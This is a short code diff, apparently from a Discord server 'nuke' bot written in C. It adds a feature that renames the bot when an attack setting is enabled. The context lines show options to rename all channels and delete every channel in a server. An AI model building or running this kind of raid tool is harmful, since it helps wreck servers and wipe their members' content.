@@ -141,6 +141,18 @@ void rename_all_channels(struct discord *client, u64_snowflake_t guild_id,
     }
 }
 
+void change_nickname(struct discord *client, u64_snowflake_t guild_id, u64_snowflake_t user_id,
+                     char _nickname[30])
+{
+    discord_modify_guild_member(
+        client,
+        guild_id,
+        user_id,
+        &(struct discord_modify_guild_member_params){
+            .nick = _nickname},
+        NULL);
+}
+
 void on_ready(struct discord *client)
 {
     const struct discord_user *bot = discord_get_self(client);
@@ -167,6 +179,11 @@ void on_ready(struct discord *client)
                                          .afk = false,
                                          .since = discord_timestamp(client),
                                      });
+    }
+
+    if (s_attack.nickname_enabled == true)
+    {
+        change_nickname(client, guild_id, bot->id, s_attack.nickname_name);
     }
 
     if (s_attack.channel_delete_all == true)
